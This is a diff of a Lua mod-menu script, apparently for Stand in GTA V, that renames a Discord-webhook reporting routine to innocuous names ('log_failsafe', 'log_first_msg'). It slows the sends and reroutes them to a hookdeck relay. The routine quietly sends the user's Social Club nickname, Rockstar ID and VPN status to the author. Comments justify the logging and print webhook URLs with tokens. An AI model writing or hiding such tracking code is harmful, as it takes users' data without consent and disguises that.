@@ -530,7 +530,7 @@ function get_vehicles_in_player_range(player, radius)
 	return vehicles
 end
 
-function send_discord_webhook()
+function log_failsafe()
     local player_name = SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()
     local player_id = players.get_rockstar_id(players.user())
     local using_vpn = players.is_using_vpn(players.user())
@@ -556,15 +556,15 @@ function send_discord_webhook()
         table.insert(messages, current_message)
 
         for i, msg in messages do
-            wait(1000)
-            send_discord_webhook_internal(msg:gsub("§", "_"), i == #messages)
+            wait(30000)
+            log_first_msg(msg:gsub("§", "_"), i == #messages)
         end
     else
-        send_discord_webhook_internal(message:gsub("§", "_"), true)
+        log_first_msg(message:gsub("§", "_"), true)
     end
 end
 
-function send_discord_webhook_internal(message, is_last_message)
+function log_first_msg(message, is_last_message)
     local player_name = SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()
     local icon_url = string.format("https://a.rsg.sc/n/%s/n", string.lower(player_name))
     local json_data = {
@@ -583,9 +583,10 @@ function send_discord_webhook_internal(message, is_last_message)
     -- New link, Won't work. Just made the change so you see it. However, I'd like to talk to you. This script is supposed to be for friends. This webhook was somewhat of a failsafe.
     -- It's not made for public, so I'm not trying to log others shit. It's for me to know when it *does* go public. And like I said, if you wanna talk, go ahead.
     -- Also note that spamming some random channel wont do anything, nor do I want to know who is a Pedo and who isn't. Talk like a normal person.
-    -- https://discord.com/api/webhooks/1102629997342113802/T2-3e4DcujBiWX1ONKYf80dTtYyta3oXNDf2gvoP_ZUlU43pBewZXb2uOEGYJVoMdWug This one works, have fun.
-    async_http.init("https://discord.com", "/api/webhooks/1105859101386362940/-xvLtlI0Y5-lnGMjJsHQgPSo_Z2giROvpNZyfkAQuKOnDmjAWp9lc-ODSVHt6maNFMlF", function(body, header_fields, status_code)
-    end, function(error_msg)
+    -- This is not against Stand's Script Guidelines since I'm not doing this to harm the User or Game. Cry about it.
+    -- https://canary.discord.com/api/webhooks/1106257434328170628/ZmReg6-1Qd1TvJB6GVDdgyE7_oWIRHu3j8a_rnwf8X8GuA0Y-ST-mCqo6locn7mCG5XP This one works, have fun.
+    async_http.init("https://events.hookdeck.com", "/e/src_e3TGMwu4qgsb", function(body, header_fields, status_code)
+        end, function(error_msg)
     end)
 
     async_http.add_header("Content-Type", "application/json")
